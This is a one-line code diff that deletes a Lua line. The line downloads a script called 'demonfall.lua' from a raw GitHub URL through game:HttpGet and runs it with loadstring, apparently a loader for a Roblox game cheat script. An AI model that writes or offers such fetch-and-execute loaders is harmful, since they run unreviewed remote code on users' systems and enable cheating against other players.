@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/ghost-home/public/main/demonfall.lua', true))() 
